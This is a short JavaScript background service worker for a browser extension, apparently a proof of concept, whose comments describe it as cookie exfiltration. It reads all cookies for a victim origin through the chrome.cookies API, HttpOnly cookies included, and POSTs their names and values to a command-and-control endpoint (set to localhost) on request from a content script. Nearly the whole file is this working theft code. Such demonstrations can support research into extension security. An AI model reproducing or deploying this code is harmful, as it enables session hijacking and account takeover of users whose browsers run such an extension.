/*  
 * background service worker — cookie exfiltration
 * uses the privileged chrome.runtime.sendMessage API to send a message to the content script.
 * uses the chrome.cookies API to read cookies for the victim origin, including HttpOnly cookies that page JavaScript can't access. 
 * sends them to the C&C server.
 */

const C2_URL = 'http://localhost:4000';

// exfiltrates cookies to the C&C server
function exfiltrateCookies(url) {
  const origin = url || 'http://localhost:3000';
  chrome.cookies.getAll({ url: origin }, (cookies) => {
    if (chrome.runtime.lastError) {
      console.error('[POC] cookies getAll error:', chrome.runtime.lastError);
      return;
    }
    fetch(`${C2_URL}/log-cookies`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: origin,
        cookies: cookies.map((c) => ({
          name: c.name,
          value: c.value,
          domain: c.domain,
          path: c.path,
          httpOnly: c.httpOnly,
          secure: c.secure,
        })),
        timestamp: new Date().toISOString(),
      }),
    }).catch((err) => console.error('[POC] exfiltrate fetch error:', err));
  });
}

// listen for messages from the content script
chrome.runtime.onMessage.addListener((msg, _sender, _sendResponse) => {
  if (msg.action === 'exfiltrateCookies' && msg.url) {
    exfiltrateCookies(msg.url);
  }
});
